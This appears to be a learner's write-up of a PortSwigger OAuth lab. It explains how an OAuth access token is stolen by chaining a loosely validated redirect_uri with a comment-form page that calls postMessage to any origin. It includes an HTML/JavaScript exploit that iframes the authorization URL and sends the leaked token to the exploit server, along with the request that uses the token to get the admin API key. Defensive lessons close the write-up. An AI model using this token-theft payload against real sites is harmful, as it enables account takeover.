# OAuth Lab 6 — Stealing OAuth access tokens via a proxy page — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** OAuth 2.0 authentication
**Lab:** Stealing OAuth access tokens via a proxy page
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~04:59 PKT (answer submitted via the lab's own `/submitSolution` endpoint, `{"correct":true}`, banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Access token theft via `redirect_uri` path traversal chained with an insecure `postMessage` proxy page — the OAuth provider loosely validates `redirect_uri`, and the blog's comment form (loaded as an `iframe` on each post) uses `postMessage()` to send `window.location.href` to its parent window with target origin `*`, so a page that iframes the comment form can read the victim's access token from the URL fragment.

## Solution

1. Completed a normal implicit-flow social login as `wiener:peter` via `/my-account` (establishes the provider session). The callback page's JavaScript calls `GET https://<oauth>/me` with `Authorization: Bearer <token>` — the response includes the user's `apikey`.
2. Built an exploit on the lab's own exploit server: an `iframe` whose `src` is the authorization URL with `redirect_uri` traversed to the comment form, plus a `message` listener that leaks whatever the iframe posts:
   ```html
   <iframe src="https://oauth-<id>.oauth-server.net/auth?client_id=<id>&redirect_uri=https://<lab>/oauth-callback/../post/comment/comment-form&response_type=token&nonce=<n>&scope=openid%20profile%20email"></iframe>
   <script>
       window.addEventListener('message', function(e) {
           fetch("/" + encodeURIComponent(e.data.data))
       }, false)
   </script>
   ```
3. Delivered the exploit to the victim. Chain: victim's browser loads the iframe → provider redirects it to `/post/comment/comment-form#access_token=<victim-token>` → the comment form's JavaScript `postMessage()`s its own `window.location.href` (fragment included) to the parent window with origin `*` → the parent's listener fetches `"/" + encodeURIComponent(<comment-form-URL-with-token>)` → the request lands in the exploit server's access log.
4. Read the victim's token from the access log (URL-decoded the entry), then called the userinfo endpoint with it:
   ```
   GET https://oauth-<id>.oauth-server.net/me
   Authorization: Bearer <victim-token>
   → {"sub":"administrator","apikey":"<admin-api-key>",...}
   ```
5. Submitted the admin's API key with `POST /submitSolution` (`answer=<key>`) — the response was `{"correct":true}` and the home page showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** the comment form is a "proxy page" — it runs in the victim's browser with the token in its URL, and it voluntarily broadcasts that URL to any parent via `postMessage(..., '*')`. The attacker's page only has to iframe it and listen.
- **Why the traversal matters:** the provider's loose `redirect_uri` check lets the token be delivered to the comment form (a page on the blog itself) instead of the real callback — the token never leaves the blog's origin until the comment form hands it over.
- **The key detail:** `postMessage` with target origin `*` is the hole — the form trusts any parent window, so an attacker-controlled parent receives the full URL including the fragment.

## Lessons Learned

- Validate `redirect_uri` with an exact match against the registered whitelist — never allow appended path segments or traversal sequences.
- Never call `postMessage()` with target origin `*` when the message contains sensitive data (URLs, tokens); always specify the exact expected origin, and validate `event.origin` on the receiving side.
- The implicit flow exposes tokens in the browser URL — use the authorization code flow with PKCE instead, so tokens are never in fragments that any iframe can read.
